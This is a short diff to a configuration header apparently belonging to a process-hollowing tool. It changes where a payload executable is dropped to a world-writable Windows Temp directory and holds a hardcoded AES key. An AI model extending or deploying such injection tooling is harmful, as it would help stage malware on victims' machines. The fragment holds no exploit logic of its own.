@@ -55,8 +55,9 @@ DWORD RunHollowPipeline();  // processhollowing/hollow.cpp
 #define AES_KEY_HEX "6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b"
 #endif
 // hollow.cpp hardcodes this path; payload must land here.
+// C:\Windows\Temp is writable by all users (BUILTIN\Users has WD).
 #ifndef PAYLOAD_PATH
-#define PAYLOAD_PATH "C:\\Users\\Public\\payload.exe"
+#define PAYLOAD_PATH "C:\\Windows\\Temp\\payload.exe"
 #endif
 
 // ── Minimal JSON helpers ──────────────────────────────────────────────────────
